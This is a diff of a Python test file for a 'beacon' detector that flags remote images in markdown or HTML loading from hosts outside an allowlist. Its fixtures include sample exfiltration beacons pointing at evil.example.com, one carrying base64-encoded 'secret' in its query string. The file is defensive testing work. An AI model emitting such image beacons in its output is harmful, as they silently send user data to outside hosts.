@@ -117,32 +117,31 @@ def test_a_reference_definition_only_counts_when_an_image_uses_it():
 # ---------------------------------------------------------------------------
 
 
-def test_an_allowed_host_is_silent_and_an_unknown_one_is_not():
-    """The noise problem, and the reason the design is an allowlist rather
-    than anything that reasons about the payload."""
-    text = (
+def test_the_allowlist_compares_hosts_the_way_a_browser_resolves_them():
+    """The allowlist is the only part of this with nothing to bypass, which
+    makes getting the comparison exactly right the whole job.
+
+    It is **hierarchical**, because an allowlist naming `example.com` that
+    then flagged `cdn.example.com` reads as broken and gets replaced by
+    something broader. It is **not a suffix match**: `notexample.com` ends
+    with `example.com` as a string and is a different host, so the dot is
+    doing real work. And it is **case-insensitive**, because host names are.
+
+    A badge from an allowed host stays silent, which is the noise problem this
+    design exists for -- and the reason it is an allowlist rather than
+    anything that tries to reason about the payload.
+    """
+    mixed = (
         "![build](https://img.shields.io/badge/build-passing-green)\n"
         "![](https://evil.example.com/p.gif?d=c2VjcmV0)"
     )
-    finding = beacon.assess(text, ("img.shields.io",))
+    finding = beacon.assess(mixed, ("img.shields.io",))
     assert finding.hosts == ["evil.example.com"]
     assert finding.allowed == ["img.shields.io"]
 
-
-def test_the_allowlist_covers_subdomains():
-    """An allowlist naming `example.com` that then flagged `cdn.example.com`
-    reads as broken, and gets replaced by something broader."""
     assert not beacon.assess("![](https://cdn.example.com/a.png)", ("example.com",))
     assert beacon.assess("![](https://example.com.evil.test/a.png)", ("example.com",))
-
-
-def test_the_allowlist_does_not_match_a_suffix_by_accident():
-    """`notexample.com` ends with `example.com` as a string and is a different
-    host. The dot in the comparison is doing real work."""
     assert beacon.assess("![](https://notexample.com/a.png)", ("example.com",))
-
-
-def test_hosts_are_compared_without_regard_to_case():
     assert not beacon.assess("![](https://IMG.Shields.IO/x.png)", ("img.shields.io",))
 
 
@@ -167,22 +166,22 @@ def test_every_auto_fetching_attribute_in_a_tag_is_seen():
     assert not beacon.assess(stopped)
 
 
-def test_srcset_carries_more_than_one_url():
-    """`srcset` is a comma-separated list with a descriptor after each URL, so
-    reading only the first would leave the second fetching."""
-    text = '<img srcset="https://img.shields.io/a.png 1x, https://evil.example.com/b.png 2x">'
-    finding = beacon.assess(text, ("img.shields.io",))
-    assert finding.hosts == ["evil.example.com"]
+def test_a_url_is_found_in_every_shape_markup_can_hide_one_in():
+    """Three shapes that each got past a first implementation, and a fourth
+    that must not take the gateway down.
 
+    `srcset` is a comma-separated list with a descriptor after each URL, so
+    reading only the first leaves the second fetching. A **protocol-relative**
+    `//host/x.png` fetches over whatever scheme the page used, which makes it
+    remote and makes a naive `startswith("http")` miss it. And an
+    **unparseable** URL has to be walked past rather than raised on: a gateway
+    that falls over on malformed markup is a gateway an attacker can stop.
+    """
+    srcset = '<img srcset="https://img.shields.io/a.png 1x, https://evil.example.com/b.png 2x">'
+    assert beacon.assess(srcset, ("img.shields.io",)).hosts == ["evil.example.com"]
 
-def test_a_protocol_relative_url_is_remote():
-    """`//host/x.png` fetches over whatever scheme the page used, which makes
-    it remote, and makes a naive `startswith("http")` check miss it."""
     assert beacon.assess("![](//evil.example.com/p.gif?d=q)").hosts == ["evil.example.com"]
 
-
-def test_a_malformed_url_does_not_raise():
-    """A gateway must not fall over on the way past something unparseable."""
     beacon.assess('<img src="https://[not-a-host/x.png">')
     beacon.assess("![](https://)")
 
